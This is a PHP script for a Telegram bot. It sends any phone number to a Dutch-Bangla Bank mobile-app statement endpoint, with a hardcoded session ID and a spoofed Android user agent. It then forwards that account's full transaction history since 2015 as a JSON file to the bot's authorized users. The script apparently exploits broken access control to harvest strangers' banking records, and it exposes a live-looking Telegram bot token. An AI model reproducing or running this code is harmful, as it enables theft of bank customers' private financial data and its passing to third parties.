
<?php
// Load Bot Token from environment variables or a config file
$botToken = getenv('7928509299:AAG-ALSnKikP9c20NfTHO8CRP8fhmGA4vHs'); // Recommended: use .env or other secure ways to store token
$apiUrl = "https://api.telegram.org/bot$botToken";

// API URL for statement
$statementUrl = "https://mbapps1.dutchbanglabank.com/LocationService/services/statement";

// File to store authorized users (persistent storage)
$authFile = "authorized_users.json";

// Check if authorized users file exists, if not create it
if (!file_exists($authFile)) {
    file_put_contents($authFile, json_encode([]));
}

// Fetch authorized users from the file
$authorizedUsers = json_decode(file_get_contents($authFile), true);

// Handle incoming updates
$update = json_decode(file_get_contents("php://input"), true);

if (isset($update["message"])) {
    $chatId = $update["message"]["chat"]["id"];
    $message = $update["message"]["text"];
    $userId = $update['message']['from']['id'];

    // If the user is not authorized, reject any commands
    if (!in_array($userId, $authorizedUsers)) {
        sendMessage($chatId, " You are not authorized to use this bot.");
        exit;
    }

    // Check the command
    if ($message == "/start") {
        // Send welcome message
        $responseText = " Welcome! Please provide your phone number to fetch your transaction data.";
        sendMessage($chatId, $responseText);
    } elseif (is_numeric($message)) {
        // Assume the message is a phone number
        $phone = $message;
        $txnData = fetchTransactionData($phone, $statementUrl);

        if (isset($txnData['error'])) {
            // Send error message
            sendMessage($chatId, " Error: " . $txnData['error']);
        } else {
            // Save response as JSON and send file
            $jsonFileName = "txn_data_$phone.json";
            file_put_contents($jsonFileName, json_encode($txnData, JSON_PRETTY_PRINT));
            sendDocument($chatId, $jsonFileName);

            // Clean up file
            unlink($jsonFileName);
        }
    } elseif (strpos($message, "/grant") === 0) {
        // Command to grant access to another user
        if (isAdmin($userId)) {
            $newUserId = (int) substr($message, 7); // Extract user ID from the message
            if (!in_array($newUserId, $authorizedUsers)) {
                $authorizedUsers[] = $newUserId;
                file_put_contents($authFile, json_encode($authorizedUsers));
                sendMessage($chatId, "✅ User with ID $newUserId has been granted access.");
            } else {
                sendMessage($chatId, "❌ This user is already authorized.");
            }
        } else {
            sendMessage($chatId, "❌ You don't have permission to grant access.");
        }
    } elseif (strpos($message, "/revoke") === 0) {
        // Command to revoke access from a user
        if (isAdmin($userId)) {
            $userIdToRevoke = (int) substr($message, 8); // Extract user ID from the message
            if (in_array($userIdToRevoke, $authorizedUsers)) {
                $authorizedUsers = array_diff($authorizedUsers, [$userIdToRevoke]);
                file_put_contents($authFile, json_encode($authorizedUsers));
                sendMessage($chatId, "✅ User with ID $userIdToRevoke has been revoked access.");
            } else {
                sendMessage($chatId, "❌ This user is not authorized.");
            }
        } else {
            sendMessage($chatId, "❌ You don't have permission to revoke access.");
        }
    } else {
        // Invalid input message
        $responseText = "❓ Please provide a valid phone number.";
        sendMessage($chatId, $responseText);
    }
}

// Function to fetch transaction data
function fetchTransactionData($phone, $url) {
    $headers = [
        "Content-Type: application/json; charset=utf-8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; TECNO CE7j Build/RP1A.200720.011)",
        "Host: mbapps1.dutchbanglabank.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip"
    ];

    $dateFrom = "29/05/2015";
    $dateTo = date("d/m/Y");

    $postData = json_encode([
        "initiatorId" => $phone,
        "version" => "2.0.65",
        "sessionId" => "Q8D6ZILF7AAHIWMIZRDHK84Z7ZL1ZZ9U",
        "reportType" => "Txn",
        "dateFrom" => $dateFrom,
        "dateTo" => $dateTo,
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if ($response === false) {
        return ["error" => "Error: " . curl_error($ch)];
    }

    curl_close($ch);
    return json_decode($response, true);
}

// Function to send a message
function sendMessage($chatId, $text) {
    global $apiUrl;
    file_get_contents("$apiUrl/sendMessage?chat_id=$chatId&text=" . urlencode($text));
}

// Function to send a document
function sendDocument($chatId, $filePath) {
    global $apiUrl;

    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath)
    ];

    $ch = curl_init("$apiUrl/sendDocument");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_exec($ch);
    curl_close($ch);
}

// Function to check if the user is an admin
function isAdmin($userId) {
    $adminIds = [5245125574]; // Replace with the admin's Telegram User ID
    return in_array($userId, $adminIds);
}
?>
